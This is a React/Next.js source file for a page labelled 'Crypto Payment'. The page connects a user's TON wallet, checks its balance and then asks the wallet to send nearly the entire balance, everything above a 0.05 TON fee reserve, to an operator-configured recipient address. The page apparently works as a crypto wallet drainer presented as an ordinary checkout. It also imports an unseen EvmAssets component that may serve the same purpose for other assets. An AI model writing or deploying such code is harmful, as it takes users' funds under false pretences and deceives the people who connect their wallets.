"use client";

import { useState } from "react";
import { EvmAssets } from "@/components/EvmAssets";
import {
  useTonConnectUI,
  useIsConnectionRestored,
  useTonAddress,
} from "@tonconnect/ui-react";

import { getTonBalance } from "@/ton/balance";
import {
  calculateMaximumTransfer,
  formatTon,
} from "@/ton/calculator";
import { requestTonPayment } from "@/ton/payment";

const RECIPIENT = process.env.NEXT_PUBLIC_TON_RECIPIENT!;
const FEE_RESERVE = BigInt("50000000");

type Status = "idle" | "loading" | "pending" | "paid" | "failed";

export default function Home() {
  const [tonConnectUI] = useTonConnectUI();
  const isConnectionRestored = useIsConnectionRestored();
  const userAddress = useTonAddress();

  const [status, setStatus] = useState<Status>("idle");
  const [balance, setBalance] = useState<string | null>(null);
  const [maximum, setMaximum] = useState<bigint | null>(null);
  const [error, setError] = useState("");

  async function loadBalance() {
    if (!userAddress) {
      await tonConnectUI.openModal();
      return;
    }

    setStatus("loading");
    setError("");

    try {
      const currentBalance = await getTonBalance(userAddress);

      const calculated = calculateMaximumTransfer(
        currentBalance,
        FEE_RESERVE
      );

      setBalance(formatTon(currentBalance));
      setMaximum(calculated);
      setStatus("idle");
    } catch (err) {
      console.error(err);
      setError("Unable to retrieve wallet balance.");
      setStatus("failed");
    }
  }

  async function handlePay() {
    if (!userAddress) {
      await tonConnectUI.openModal();
      return;
    }

    if (!maximum || maximum <= BigInt("0")) {
      setError("No transferable balance available.");
      return;
    }

    if (!RECIPIENT) {
      setError("Receiving wallet is not configured.");
      return;
    }

    setStatus("pending");
    setError("");

    try {
      await requestTonPayment(
        tonConnectUI,
        RECIPIENT,
        maximum
      );

      setStatus("idle");
      setError(
        "Wallet response received. Verify the transaction on-chain before marking it paid."
      );
    } catch (err) {
      console.error(err);
      setStatus("failed");
      setError("Payment request failed or was rejected.");
    }
  }

  if (!isConnectionRestored) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-neutral-950 text-neutral-300">
        Loading...
      </main>
    );
  }

  return (
    <main className="mx-auto flex min-h-screen max-w-md flex-col gap-6 bg-neutral-950 p-5 text-neutral-100">
      <header className="flex items-center justify-between">
        <h1 className="text-xl font-semibold">Crypto Payment</h1>
        <span className="rounded bg-neutral-800 px-3 py-1 text-xs">
          TON
        </span>
      </header>

      <EvmAssets />

      <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
        <h2 className="mb-3 font-medium">
          {userAddress ? "Connected wallet" : "Connect wallet"}
        </h2>

        {userAddress && (
          <p className="mb-4 break-all font-mono text-xs text-neutral-400">
            {userAddress.slice(0, 8)}...{userAddress.slice(-6)}
          </p>
        )}

        <button
          onClick={loadBalance}
          disabled={!userAddress || status === "loading" || status === "pending"}
          className="mb-3 w-full rounded-lg border border-neutral-700 px-4 py-3 font-medium disabled:opacity-50"
        >
          {status === "loading" ? "Loading balance..." : "Check TON balance"}
        </button>

        {balance !== null && (
          <div className="mb-4 rounded-lg bg-neutral-800 p-3">
            <p className="text-xs text-neutral-400">Wallet balance</p>
            <p className="text-xl font-semibold">{balance} TON</p>

            <p className="mt-2 text-xs text-neutral-400">
              Calculated transferable amount
            </p>

            <p className="text-lg font-semibold text-emerald-400">
              {maximum !== null ? formatTon(maximum) : "0"} TON
            </p>

            <p className="mt-2 text-xs text-neutral-500">
              Estimated fee reserve: 0.05 TON
            </p>
          </div>
        )}

        <button
          onClick={handlePay}
          disabled={
            !userAddress ||
            maximum === null ||
            maximum <= BigInt("0") ||
            status === "pending" ||
            status === "loading"
          }
          className="w-full rounded-lg bg-emerald-600 px-4 py-3 font-semibold hover:bg-emerald-500 disabled:opacity-50"
        >
          {status === "pending"
            ? "Waiting for wallet..."
            : "Continue to TON wallet"}
        </button>
      </section>

      <p className="text-center text-xs text-neutral-500">
        Review the recipient and amount in your wallet before approving.
      </p>

      {error && (
        <div className="rounded-lg border border-amber-700 bg-amber-950 p-3 text-xs text-amber-300">
          {error}
        </div>
      )}

      {status === "failed" && (
        <div className="rounded-lg border border-red-700 bg-red-950 p-3 text-xs text-red-300">
          Payment request failed. Check your connection and try again.
        </div>
      )}
    </main>
  );
}

